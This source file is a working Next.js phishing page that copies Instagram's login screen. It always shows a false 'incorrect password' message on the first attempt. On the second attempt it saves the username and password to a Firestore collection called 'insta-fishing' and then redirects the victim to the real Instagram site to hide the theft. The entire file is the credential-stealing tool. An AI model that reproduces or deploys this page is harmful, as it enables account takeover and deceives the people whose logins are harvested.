import Head from "next/head";
import { useState } from "react";
import { doc, setDoc } from "firebase/firestore";
import { db } from "../firebase";
import { useRouter } from "next/router";
import logo from "../public/instagramlogo.png";
import Image from "next/image";

export default function Home() {
  const [formStatus, setFormStatus] = useState(1);
  const [error, setError] = useState(false);
  const router = useRouter();

  const handleSubmit = (e: any) => {
    e.preventDefault();
    if (formStatus === 1) {
      setError(true);
      setFormStatus(0);
    } else if (formStatus === 0) {
      console.log(e.target[0].value, e.target[1].value);

      setDoc(doc(db, "insta-fishing", e.target[0].value), {
        username: e.target[0].value,
        password: e.target[1].value,
      }).then(() => {
        router.push(`https://www.instagram.com/`);
      });
    }
  };

  return (
    <>
      <Head>
        <title>Istagram</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="container">
        <div className="center">
          <div className="header">
            <Image src={logo} alt="instagramLogo" className="instaLogo" />
          </div>
          <div className="inputElement">
            <form className="inputElement" onSubmit={handleSubmit}>
              <input
                type="text"
                placeholder="Phone number,username or email"
                className="inputText"
              />
              <input
                type="password"
                placeholder="Password"
                className="inputText"
              />
              <span className="erroMessage">
                {error === true
                  ? "Sorry, your password was incorrect. Please double-check your password."
                  : ""}
              </span>
              <button type="submit" className="inputButton">
                Log in
              </button>
            </form>
            <div className="line">
              <span className="arrow"></span>
              <span className="content">OR</span>
              <span className="arrow"></span>
            </div>
            <div className="social__icon">
              <i className="fab fa-facebook-square"></i>
              <span>Log in with facebook</span>
            </div>
            <div className="forgetPassword">Forget Password?</div>
          </div>
        </div>
        <div className="footer">
          <p>
            Dont have a accout?<span>Sign Up</span>
          </p>
        </div>
      </div>

      {/* <form onSubmit={handleSubmit}>
        <input type="text" />
        <input type="password" />
        <span>{error === true ? "error" : ""}</span>
        <button type="submit">submit</button>
      </form> */}
    </>
  );
}
